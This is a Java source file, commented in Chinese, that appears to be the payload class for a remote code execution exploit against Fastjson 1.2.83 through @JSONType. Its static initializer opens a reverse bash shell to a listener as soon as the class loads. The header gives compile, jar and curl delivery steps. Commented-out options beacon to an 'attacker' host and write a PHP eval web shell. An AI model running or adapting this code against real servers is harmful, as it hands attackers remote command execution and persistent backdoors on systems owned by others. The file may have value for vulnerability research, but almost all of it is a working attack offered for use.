/*
 * GenProbe.java - Fastjson 1.2.83 @JSONType RCE 恶意类构造
 *
 * 这个类就是被远程加载的"恶意类"。关键点:
 *   1. @JSONType 注解 - 使 Fastjson 的 TypeCollector.hasJsonType() 返回 true
 *   2. 静态初始化块 <clinit> - 在类定义阶段自动执行，无需实例化
 *   3. 默认行为: 反弹 shell 到 127.0.0.1:4444
 *
 * 编译方式:
 *   javac -cp fastjson-1.2.83.jar GenProbe.java
 *
 * 打包方式:
 *   jar cf probe.jar com/alibaba/fastjson/poc/GenProbe.class
 *
 * 使用方式:
 *   # 终端 1: 启动 nc 监听
 *   nc -lvnp 4444
 *
 *   # 终端 2: 启动 HTTP 服务托管 JAR
 *   python3 serve.py
 *
 *   # 终端 3: 发送 payload
 *   curl -X POST -H 'Content-Type: application/json' \
 *     --data '{"@type":"jar:http:..2130706433:19090.probe!.GenProbe","x":1}' \
 *     http://target:18080/parse
 */

package com.alibaba.fastjson.poc;

import com.alibaba.fastjson.annotation.JSONType;

@JSONType  // 关键: 这个注解使 Fastjson 的 jsonType=true
public class GenProbe {

    // <clinit> 静态初始化块 - 在类定义阶段自动执行
    static {
        /*
         * 默认: 反弹 shell 到 127.0.0.1:4444
         * 使用方式: nc -lvnp 4444
         */
        revShell("127.0.0.1", 4444);

        /* ---- 其他利用方式（注释掉，按需启用） ---- */

        // 创建标记文件（用于本地验证，无害）
        // touch("/tmp/GenProbe.flag");

        // 执行命令
        // exec("curl http://attacker:8080/beacon");

        // 写入 WebShell
        // writeFile("/var/www/html/shell.php", "<?php @eval($_POST['c']);?>");
    }

    /** 反弹 shell */
    static void revShell(String host, int port) {
        try {
            java.net.Socket s = new java.net.Socket(host, port);
            Process p = Runtime.getRuntime().exec("/bin/bash");
            java.io.InputStream pIn = p.getInputStream();
            java.io.InputStream pErr = p.getErrorStream();
            java.io.OutputStream pOut = p.getOutputStream();
            java.io.InputStream sIn = s.getInputStream();
            java.io.OutputStream sOut = s.getOutputStream();

            // Thread: bash stdout -> socket
            new Thread(() -> {
                try { byte[] b = new byte[4096]; int n;
                    while ((n = pIn.read(b)) != -1) sOut.write(b, 0, n);
                } catch (Exception ignored) {}
            }).start();

            // Thread: bash stderr -> socket
            new Thread(() -> {
                try { byte[] b = new byte[4096]; int n;
                    while ((n = pErr.read(b)) != -1) sOut.write(b, 0, n);
                } catch (Exception ignored) {}
            }).start();

            // Main thread: socket -> bash stdin
            byte[] b = new byte[4096];
            int n;
            while ((n = sIn.read(b)) != -1) pOut.write(b, 0, n);
        } catch (Exception ignored) {}
    }

    /** 创建标记文件 */
    static void touch(String path) {
        try { new java.io.File(path).createNewFile(); } catch (Exception ignored) {}
    }

    /** 执行命令 */
    static void exec(String cmd) {
        try { Runtime.getRuntime().exec(cmd); } catch (Exception ignored) {}
    }

    /** 写入文件 */
    static void writeFile(String path, String content) {
        try {
            java.nio.file.Files.write(java.nio.file.Paths.get(path), content.getBytes());
        } catch (Exception ignored) {}
    }
}